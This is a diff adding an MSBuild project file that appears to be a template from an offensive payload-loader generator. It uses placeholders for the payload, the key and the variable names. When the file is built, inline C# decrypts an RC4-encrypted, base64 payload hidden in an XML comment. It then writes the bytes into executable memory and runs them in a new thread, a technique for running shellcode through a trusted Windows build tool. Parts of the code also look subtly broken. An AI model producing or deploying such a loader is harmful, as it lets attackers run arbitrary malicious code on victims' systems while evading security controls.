@@ -1,0 +1,120 @@
+<!--
+[PAYLOAD]
+-->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="VAR1">
+   <VAR1 />
+   <VAR2 />
+   </Target>
+  <UsingTask
+    TaskName="VAR1"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+	  <Using Namespace="System.IO" />
+      <Code Type="Fragment" Language="cs">
+      </Code>
+    </Task>
+	</UsingTask>
+	<UsingTask
+    TaskName="VAR2"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+		using System;
+		using System.IO;
+		using System.Text;
+		using System.Management.Automation;
+		using System.Collections.Generic;
+		using System.Collections.ObjectModel;
+		using Microsoft.Build.Utilities;
+		using Microsoft.Build.Framework;
+		using System.Management.Automation.Runspaces;
+		
+		public class VAR2 :  Task, ITask {	
+			private static UInt32 VAR40 = 0x1000;
+			private static UInt32 VAR41 = 0x40;
+			[DllImport("kernel32")]
+			private static extern UInt32 VirtualAlloc(UInt32 VAR21, UInt32 VAR12, UInt32 VAR16, UInt32 VAR8);
+			[DllImport("kernel32")]
+			private static extern IntPtr CreateThread(UInt32 VAR15, UInt32 VAR21, UInt32 VAR1, IntPtr VAR3, UInt32 VAR30, ref UInt32 VAR7);
+			[DllImport("kernel32")]
+			private static extern UInt32 WaitForSingleObject(IntPtr VAR4, UInt32 VAR17);
+			
+			public override bool Execute() {
+				string[] VAR3 = Environment.GetCommandLineArgs();
+			
+				StreamReader VAR6 = File.OpenText(VAR3[1]);
+				StringBuilder VAR7 = new StringBuilder();
+				string VAR8;
+				while((VAR8 = VAR6.ReadLine()) != null) {
+						if(String.Equals(VAR8, "-->")) {
+							byte[] VAR9 = {[KEY]};
+							byte[] VAR10 = Convert.FromBase64String(VAR7.ToString());
+							byte[] VAR11 = VAR16.VAR28(VAR9, VAR10));
+						
+							UInt32 VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
+							Marshal.Copy(VAR11, 0, (IntPtr)(VAR42), VAR11.Length);
+							IntPtr VAR43 = IntPtr.Zero;
+							IntPtr VAR44 = IntPtr.Zero;
+							UInt32 VAR45 = 0;
+							VAR43 = CreateThread(0, 0, VAR42, VAR44, ref VAR45);
+							WaitForSingleObject(VAR43, 0xFFFFFFFF);
+							return true;
+						}
+						if(!String.Equals(VAR8, "<!--")) {
+							VAR7.AppendLine(VAR8);
+						}
+				}
+				return true;
+			}
+		}
+		
+		public class VAR16 {
+			public static byte[] VAR17(byte[] VAR18, byte[] VAR19) {
+				int VAR20, VAR21, VAR22, VAR23, VAR24;
+				int[] VAR25, VAR26;
+				byte[] VAR27;
+
+				VAR25 = new int[256];
+				VAR26 = new int[256];
+				VAR27 = new byte[VAR19.Length];
+
+				for (VAR21 = 0; VAR21 < 256; VAR21++) {
+					VAR25[VAR21] = VAR18[VAR21 % VAR18.Length];
+					VAR26[VAR21] = VAR21;
+				}
+				for (VAR22 = VAR21 = 0; VAR21 < 256; VAR21++) {
+					VAR22 = (VAR22 + VAR26[VAR21] + VAR25[VAR21]) % 256;
+					VAR24 = VAR26[VAR21];
+					VAR26[VAR21] = VAR26[VAR22];
+					VAR26[VAR22] = VAR24;
+				}
+				for (VAR20 = VAR22 = VAR21 = 0; VAR21 < VAR19.Length; VAR21++) {
+					VAR20++;
+					VAR20 %= 256;
+					VAR22 += VAR26[VAR20];
+					VAR22 %= 256;
+					VAR24 = VAR26[VAR20];
+					VAR26[VAR20] = VAR26[VAR22];
+					VAR26[VAR22] = VAR24;
+					VAR23 = VAR26[((VAR26[VAR20] + VAR26[VAR22]) % 256)];
+					VAR27[VAR21] = (byte)(VAR19[VAR21] ^ VAR23);
+				}
+				return VAR27;
+			}
+
+			public static byte[] VAR28(byte[] VAR29, byte[] VAR30) {
+				return VAR17(VAR29, VAR30);
+			}
+		}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
